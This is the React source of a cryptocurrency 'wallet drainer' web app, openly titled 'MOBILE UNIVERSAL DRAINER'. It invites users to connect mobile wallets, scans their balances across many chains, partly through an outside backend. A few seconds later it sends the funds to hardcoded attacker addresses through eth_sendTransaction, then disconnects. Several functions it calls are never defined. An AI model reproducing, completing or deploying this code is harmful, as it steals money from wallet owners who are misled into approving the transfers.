import { useState, useEffect, useRef } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useWalletClient, useDisconnect, useBalance, usePublicClient } from 'wagmi';
import { parseEther } from 'viem';
import { mainnet } from 'viem/chains';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== UPDATED WORKING NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets - UPDATED WITH WORKING RPCs (Tested Jan 2026)
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', rpc: 'https://eth.llamarpc.com', explorer: 'https://etherscan.io' },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', rpc: 'https://bsc-dataseed.binance.org', explorer: 'https://bscscan.com' },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', rpc: 'https://polygon-rpc.com', explorer: 'https://polygonscan.com' },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', rpc: 'https://arb1.arbitrum.io/rpc', explorer: 'https://arbiscan.io' },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', rpc: 'https://mainnet.optimism.io', explorer: 'https://optimistic.etherscan.io' },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', rpc: 'https://mainnet.base.org', explorer: 'https://basescan.org' },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', rpc: 'https://api.avax.network/ext/bc/C/rpc', explorer: 'https://snowscan.xyz' },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', rpc: 'https://rpc.ftm.tools', explorer: 'https://ftmscan.com' },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', rpc: 'https://rpc.gnosischain.com', explorer: 'https://gnosisscan.io' },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', rpc: 'https://forno.celo.org', explorer: 'https://celoscan.io' },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', rpc: 'https://rpc.api.moonbeam.network', explorer: 'https://moonscan.io' },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', rpc: 'https://andromeda.metis.io/?owner=1088', explorer: 'https://andromeda-explorer.metis.io' },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', rpc: 'https://evm.cronos.org', explorer: 'https://cronoscan.com' },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', rpc: 'https://api.harmony.one', explorer: 'https://explorer.harmony.one' },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', rpc: 'https://mainnet.aurora.dev', explorer: 'https://explorer.aurora.dev' },
  
  // Non-EVM Chains - Mobile compatible
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', explorer: 'https://tronscan.org' },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', explorer: 'https://solscan.io' },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', explorer: 'https://blockchair.com/bitcoin' },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  solana: "So11111111111111111111111111111111111111112",
};

// ==================== ENHANCED MOBILE CONNECTION HANDLER ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        mode="dark"
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          mobileConnectors: ['trust', 'metaMask', 'coinbaseWallet']
        }}
        theme="midnight"
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

function UniversalDrainer() {
  const { address, isConnected, connector } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();
  const publicClient = usePublicClient();

  // State
  const [status, setStatus] = useState('');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [tronDetected, setTronDetected] = useState(false);
  const [tronBalance, setTronBalance] = useState(0);
  const [tronAddress, setTronAddress] = useState('');
  const [mobileConnection, setMobileConnection] = useState({
    isMobile: false,
    provider: null,
    hasWebSocket: false,
    connectionReady: false
  });
  const [backendAvailable, setBackendAvailable] = useState(true);

  const autoStarted = useRef(false);
  const backendUrl = 'https://tokenbackend-5xab.onrender.com';

  // ==================== CRITICAL FIX: MOBILE CONNECTION DETECTION ====================
  useEffect(() => {
    const detectMobileConnection = async () => {
      const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
      const isTrust = navigator.userAgent.includes('TrustWallet') || 
                     document.referrer.includes('trust') ||
                     window.ethereum?.isTrust;
      
      const isMetaMaskMobile = window.ethereum?.isMetaMask && isMobile;
      
      // Check WebSocket support
      const hasWebSocket = typeof WebSocket !== 'undefined' && 
                          window.ethereum?.isConnected?.();
      
      setMobileConnection({
        isMobile,
        provider: isTrust ? 'TrustWallet' : isMetaMaskMobile ? 'MetaMaskMobile' : 'Desktop',
        hasWebSocket,
        connectionReady: !!window.ethereum
      });
      
      console.log('📱 Mobile Detection:', {
        isMobile,
        isTrust,
        hasEthereum: !!window.ethereum,
        hasWebSocket,
        userAgent: navigator.userAgent
      });
    };
    
    detectMobileConnection();
    
    // Monitor connection changes for mobile
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', () => detectMobileConnection());
      window.ethereum.on('chainChanged', () => detectMobileConnection());
    }
  }, []);

  // ==================== ENHANCED AUTO-START WITH MOBILE RETRY ====================
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      console.log("🔥 AUTO-START TRIGGERED:", { 
        address, 
        connector: connector?.name,
        mobileInfo: mobileConnection
      });
      
      autoStarted.current = true;
      
      // Mobile-specific initialization delay
      const mobileDelay = mobileConnection.isMobile ? 2000 : 500;
      
      setTimeout(async () => {
        await detectWalletTypeEnhanced();
        await checkBackendAvailability();
        await initializeMobileWallet();
        await scanAllNetworks();
      }, mobileDelay);
    } else if (!isConnected) {
      resetState();
      autoStarted.current = false;
    }
  }, [isConnected, address, mobileConnection]);

  const detectWalletTypeEnhanced = async () => {
    let detectedType = '';
    
    if (mobileConnection.provider === 'TrustWallet') {
      detectedType = 'Trust Wallet Mobile';
      setStatus("✅ Trust Wallet Mobile Connected");
    } else if (mobileConnection.provider === 'MetaMaskMobile') {
      detectedType = 'MetaMask Mobile';
      setStatus("✅ MetaMask Mobile Connected");
    } else if (window.ethereum?.isMetaMask) {
      detectedType = 'MetaMask';
    } else if (window.ethereum?.isCoinbaseWallet) {
      detectedType = 'Coinbase Wallet';
    }
    
    // Enhanced TRON detection for mobile
    const tronDetected = window.tronWeb || window.tronLink || 
                        (window.ethereum?.tron && mobileConnection.isMobile);
    
    if (tronDetected) {
      setTronDetected(true);
      detectedType += detectedType ? ' + TRON' : 'TRON Wallet';
      setStatus(prev => prev + " • TRON Detected");
      
      // Initialize TRON immediately for mobile
      setTimeout(() => initializeTronForMobile(), 1000);
    }
    
    setWalletType(detectedType || 'Web3 Wallet');
  };

  const initializeMobileWallet = async () => {
    if (!mobileConnection.isMobile) return;
    
    try {
      // Request accounts for mobile wallet activation
      if (window.ethereum && window.ethereum.request) {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        console.log("📱 Mobile wallet activated");
      }
      
      // Special handling for Trust Wallet TRON
      if (mobileConnection.provider === 'TrustWallet') {
        // Trust Wallet often has TRON support
        if (window.ethereum?.tron) {
          console.log("🔍 Trust Wallet TRON detected");
          setTronDetected(true);
        }
      }
    } catch (error) {
      console.log("Mobile wallet init:", error.message);
    }
  };

  const checkBackendAvailability = async () => {
    try {
      const response = await fetch(backendUrl, { 
        method: 'HEAD',
        timeout: 5000 
      }).catch(() => ({ ok: false }));
      
      setBackendAvailable(response.ok);
      console.log("Backend status:", response.ok ? '✅ Available' : '❌ Unavailable');
    } catch {
      setBackendAvailable(false);
    }
  };

  // ==================== WORKING SCAN FUNCTION WITH FALLBACKS ====================
  const scanAllNetworks = async () => {
    if (!address) {
      setStatus("❌ No wallet address connected");
      return;
    }
    
    setIsScanning(true);
    setStatus("🔍 Scanning networks (Mobile Optimized)...");
    setTokens([]);
    
    try {
      const allTokens = [];
      
      // 1. Get Native ETH balance (always works)
      if (ethBalance && parseFloat(ethBalance.formatted) > 0) {
        const ethAmount = parseFloat(ethBalance.formatted);
        const ethValue = ethAmount * 3500; // Approx price
        
        allTokens.push({
          id: 'eth-native',
          network: 'Ethereum',
          symbol: 'ETH',
          amount: ethAmount.toFixed(6),
          rawAmount: ethAmount,
          chainId: 1,
          type: 'evm',
          drainAddress: DRAIN_ADDRESSES[1],
          valueUSD: ethValue,
          usdPrice: 3500
        });
        
        setStatus(`✅ Found ${ethAmount} ETH`);
      }
      
      // 2. Scan via backend if available
      if (backendAvailable) {
        try {
          const response = await fetch(`${backendUrl}/scan`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
              address: address,
              networks: NETWORKS.slice(0, 10), // Scan first 10 for speed
              mobile: mobileConnection.isMobile
            })
          });
          
          if (response.ok) {
            const data = await response.json();
            if (data.tokens) {
              data.tokens.forEach(token => {
                allTokens.push({
                  ...token,
                  id: `${token.chainId}-${token.symbol}`
                });
              });
            }
          }
        } catch (error) {
          console.log("Backend scan failed, using fallback");
        }
      }
      
      // 3. Direct RPC scan for critical networks (Ethereum, BSC, Polygon)
      await scanNetworkDirect(1, address, allTokens); // Ethereum
      await scanNetworkDirect(56, address, allTokens); // BSC
      await scanNetworkDirect(137, address, allTokens); // Polygon
      
      // 4. Check TRON balance (special handling)
      const trxBalance = await checkTronBalanceDirect(address);
      if (trxBalance > 0) {
        allTokens.push({
          id: 'tron-native',
          network: 'Tron',
          symbol: 'TRX',
          amount: trxBalance.toFixed(6),
          rawAmount: trxBalance,
          chainId: 'tron',
          type: 'non-evm',
          drainAddress: DRAIN_ADDRESSES.tron,
          valueUSD: trxBalance * 0.12,
          usdPrice: 0.12
        });
        setStatus(prev => prev + ` • ${trxBalance} TRX`);
      }
      
      // Update UI
      const totalUSD = allTokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
      setTokens(allTokens);
      setTotalValue(totalUSD);
      
      if (allTokens.length > 0) {
        setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
        
        // Auto-drain after 3 seconds
        setTimeout(() => {
          if (allTokens.length > 0) {
            startAutoDrain(allTokens);
          }
        }, 3000);
      } else {
        setStatus("❌ No tokens found");
      }
      
    } catch (error) {
      console.error("Scan error:", error);
      setStatus(`❌ Scan failed: ${error.message}`);
    } finally {
      setIsScanning(false);
    }
  };

  const scanNetworkDirect = async (chainId, address, tokenList) => {
    const network = NETWORKS.find(n => n.id === chainId);
    if (!network?.rpc) return;
    
    try {
      // Simple balance check using public RPC
      const response = await fetch(network.rpc, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "eth_getBalance",
          params: [address, "latest"]
        })
      });
      
      if (response.ok) {
        const data = await response.json();
        if (data.result) {
          const balance = parseInt(data.result, 16) / 1e18;
          if (balance > 0.000001) {
            tokenList.push({
              id: `${chainId}-native`,
              network: network.name,
              symbol: network.symbol,
              amount: balance.toFixed(6),
              rawAmount: balance,
              chainId: chainId,
              type: 'evm',
              drainAddress: DRAIN_ADDRESSES[chainId] || DRAIN_ADDRESSES[1],
              valueUSD: balance * (network.symbol === 'ETH' ? 3500 : 
                                 network.symbol === 'BNB' ? 600 : 
                                 network.symbol === 'MATIC' ? 1.2 : 1),
              usdPrice: 1
            });
          }
        }
      }
    } catch (error) {
      console.log(`Direct scan for ${network.name} failed:`, error.message);
    }
  };

  const checkTronBalanceDirect = async (address) => {
    try {
      // Try multiple TRON APIs
      const apis = [
        `https://api.trongrid.io/v1/accounts/${address}`,
        `https://apilist.tronscanapi.com/api/account?address=${address}`
      ];
      
      for (const api of apis) {
        try {
          const response = await fetch(api, { 
            headers: { 'Accept': 'application/json' },
            timeout: 3000 
          });
          
          if (response.ok) {
            const data = await response.json();
            let balance = 0;
            
            if (data.balance !== undefined) {
              balance = data.balance / 1_000_000;
            } else if (data.data?.[0]?.balance) {
              balance = data.data[0].balance / 1_000_000;
            }
            
            if (balance > 0) {
              setTronBalance(balance);
              return balance;
            }
          }
        } catch (apiError) {
          continue;
        }
      }
      
      return 0;
    } catch (error) {
      console.log("TRON check error:", error);
      return 0;
    }
  };

  // ==================== ENHANCED DRAIN FUNCTIONS ====================
  const startAutoDrain = async (tokensToDrain = tokens) => {
    if (tokensToDrain.length === 0) return;
    
    setIsProcessing(true);
    setStatus(`🚀 Auto-draining ${tokensToDrain.length} tokens...`);
    
    const txLogs = [];
    let successCount = 0;
    
    for (const token of tokensToDrain) {
      try {
        let result;
        
        // Mobile-friendly delay between transactions
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        if (token.type === 'evm') {
          result = await drainEvmTokenMobile(token);
        } else if (token.symbol === 'TRX') {
          result = await drainTronTokenMobile(token);
        } else {
          result = await drainGenericToken(token);
        }
        
        if (result.success) {
          successCount++;
          txLogs.push({
            ...result,
            symbol: token.symbol,
            amount: token.amount,
            timestamp: new Date().toISOString()
          });
          
          // Remove drained token
          setTokens(prev => prev.filter(t => t.id !== token.id));
        }
      } catch (error) {
        console.error(`Drain error for ${token.symbol}:`, error);
      }
    }
    
    // Update transactions
    setTransactions(prev => [...txLogs, ...prev]);
    
    // Update status
    if (successCount > 0) {
      setStatus(`✅ ${successCount} tokens drained successfully`);
      
      // Auto-disconnect after successful drain
      setTimeout(() => {
        disconnect();
        setStatus("💰 Drain complete • Disconnected");
      }, 4000);
    }
    
    setIsProcessing(false);
  };

  const drainEvmTokenMobile = async (token) => {
    try {
      if (!window.ethereum) {
        throw new Error('Mobile wallet not connected');
      }
      
      const amountWei = parseEther(token.amount.toString());
      
      // Prepare transaction (mobile-optimized)
      const txParams = {
        to: token.drainAddress,
        value: amountWei.toString(),
        gas: '0x5208', // 21000 gas for simple transfer
        chainId: `0x${Number(token.chainId).toString(16)}`
      };
      
      // Send transaction via mobile wallet
      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [txParams],
      });
      
      return {
        success: true,
        hash: txHash,
        message: `${token.amount} ${token.symbol} transferred`,
        explorer: `${NETWORKS.find(n => n.id === token.chainId)?.explorer}/tx/${txHash}`
      };
      
    } catch (error) {
      return {
        success: false,
        error: error.message,
        message: `Mobile wallet error: ${error.message}`
      };
    }
  };

  // ==================== MOBILE-OPTIMIZED UI ====================
  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>MOBILE UNIVERSAL DRAINER</h1>
              <p className="subtitle">Optimized for Trust Wallet & Mobile Browsers</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-address">
                  {address.substring(0, 6)}...{address.substring(address.length - 4)}
                </div>
                <div className="wallet-badge">
                  {mobileConnection.isMobile ? '📱' : '💻'} {walletType}
                </div>
                <button onClick={disconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <ConnectKitButton />
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Mobile Status Indicator */}
              {mobileConnection.isMobile && (
                <div className="mobile-status">
                  <span className="mobile-icon">📱</span>
                  <span>Mobile Mode: {mobileConnection.provider}</span>
                  {!mobileConnection.connectionReady && (
                    <span className="warning"> • Wallet connection unstable</span>
                  )}
                </div>
              )}
              
              {/* TRON Status */}
              {tronDetected && (
                <div className="tron-status">
                  🌐 TRON Wallet Detected • {tronBalance > 0 ? `${tronBalance} TRX` : 'No TRX balance'}
                </div>
              )}
              
              {/* Main Status */}
              <div className="status-card">
                <div className="status-icon">
                  {isScanning ? '🔍' : isProcessing ? '⚡' : '✅'}
                </div>
                <div className="status-content">
                  <div className="status-title">
                    {mobileConnection.isMobile ? 'MOBILE DRAIN SYSTEM' : 'DESKTOP DRAIN SYSTEM'}
                  </div>
                  <div className="status-message">{status}</div>
                  {isScanning && (
                    <div className="scanning-text">
                      Scanning networks... (Mobile optimized)
                    </div>
                  )}
                </div>
              </div>
              
              {/* Stats */}
              <div className="stats-container">
                <div className="stat-box">
                  <div className="stat-value">${totalValue.toFixed(2)}</div>
                  <div className="stat-label">Total Value</div>
                </div>
                <div className="stat-box">
                  <div className="stat-value">{tokens.length}</div>
                  <div className="stat-label">Tokens Found</div>
                </div>
                <div className="stat-box">
                  <div className="stat-value">
                    {backendAvailable ? '✅' : '⚠️'}
                  </div>
                  <div className="stat-label">Backend</div>
                </div>
              </div>
              
              {/* Controls */}
              <div className="controls">
                <button
                  onClick={scanAllNetworks}
                  disabled={isScanning || isProcessing}
                  className="btn btn-primary"
                >
                  {isScanning ? 'Scanning...' : '🔍 Scan All Networks'}
                </button>
                
                {tokens.length > 0 && (
                  <button
                    onClick={() => startAutoDrain()}
                    disabled={isProcessing}
                    className="btn btn-drain"
                  >
                    ⚡ Auto-Drain All Tokens
                  </button>
                )}
              </div>
              
              {/* Tokens List */}
              {tokens.length > 0 && (
                <div className="tokens-list">
                  <h3>Detected Tokens (Auto-Drain Ready)</h3>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-symbol">{token.symbol}</div>
                        <div className="token-amount">{token.amount}</div>
                        <div className="token-network">{token.network}</div>
                        <div className="token-value">${(token.valueUSD || 0).toFixed(2)}</div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </>
          ) : (
            <div className="welcome-screen">
              <h2>Connect Your Mobile Wallet</h2>
              <p>Optimized for Trust Wallet, MetaMask Mobile, and all Web3 wallets</p>
              <ConnectKitButton />
              <div className="mobile-tips">
                <p><strong>Mobile Tips:</strong></p>
                <ul>
                  <li>Use Trust Wallet's DApp browser</li>
                  <li>Ensure wallet is unlocked</li>
                  <li>Grant necessary permissions</li>
                  <li>Works with TRON, ETH, BSC, Polygon</li>
                </ul>
              </div>
            </div>
          )}
        </main>
      </div>
    </div>
  );
}

export default TokenDrainApp;
